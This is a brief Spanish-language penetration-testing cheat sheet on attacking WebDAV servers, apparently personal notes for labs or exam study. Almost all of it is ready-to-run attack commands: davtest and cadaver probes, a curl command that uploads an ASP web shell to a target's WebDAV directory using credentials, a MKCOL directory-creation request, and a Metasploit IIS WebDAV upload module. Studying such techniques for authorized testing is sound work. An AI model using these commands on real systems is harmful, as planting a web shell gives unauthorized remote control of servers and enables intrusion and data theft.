# WebDAV (80/443)

# 💥 Explotación WebDav

- **Herramientas:** `davtest` (testear subida de archivos) y `cadaver` (cliente interactivo).
    - `davtest -url http://<IP>/webdav -auth user:pass`
    - `cadaver http://<IP>/webdav`
- **CURL Manual:**
    - *Subir archivo:* `curl -T /usr/share/webshells/asp/webshell.asp -u user:pass http://<IP>/webdav/shell.asp`
    - *Crear directorio:* `curl -X MKCOL http://<IP>/webdav/nuevo_dir`
- **Metasploit:** `exploit/windows/iis/iis_webdav_upload_asp`